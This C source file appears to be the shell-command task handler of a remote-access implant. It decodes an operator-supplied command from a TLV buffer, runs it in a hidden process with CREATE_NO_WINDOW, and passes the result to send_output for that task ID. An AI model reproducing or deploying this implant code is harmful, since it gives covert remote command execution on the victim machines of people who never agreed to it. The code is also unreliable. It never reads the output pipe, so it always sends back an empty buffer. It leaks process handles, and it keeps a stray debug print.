#include <communication.h>
#include <tlv.h>
#include <stdio.h>

void shell_cmd(int taskId, int argc, struct TLVBuild * tlv) {
  printf("[aaaaaaaa] %u", argc);

  if (argc < 1) return;
  struct TLVBuild out;
  out.buf = malloc(50);
  out.read_cursor = 0;
  out.allocsize = 50;
  out.bufsize = 0;

  int cmdSize = extractInt32(tlv);
  char * cmd = malloc(cmdSize + 1);
  extractBytes(tlv, cmdSize, cmd);
  cmd[cmdSize] = 0x00;
  printf("[cmd] executing: %s\n", cmd);

  HANDLE  hStdInPipeRead   = NULL;
  HANDLE  hStdInPipeWrite  = NULL;
  HANDLE  hStdOutPipeRead  = NULL;
  HANDLE  hStdOutPipeWrite = NULL;

  PROCESS_INFORMATION ProcessInfo     = { };
  SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
  STARTUPINFOA        StartUpInfoA    = { };

  if ( CreatePipe( &hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
  {
    return;
  }

  if ( CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
  {
    return;
  }

  StartUpInfoA.cb         = sizeof( STARTUPINFOA );
  StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
  StartUpInfoA.hStdError  = hStdOutPipeWrite;
  StartUpInfoA.hStdOutput = hStdOutPipeWrite;
  StartUpInfoA.hStdInput  = hStdInPipeRead;

  if ( CreateProcessA( NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
  {
      return;
  }

  CloseHandle( hStdOutPipeWrite );
  CloseHandle( hStdInPipeRead );

  send_output(taskId, "output", "", out.bufsize, out.buf);

  CloseHandle( hStdOutPipeRead );
  CloseHandle( hStdInPipeWrite );


  free(cmd);
  free(out.buf);
}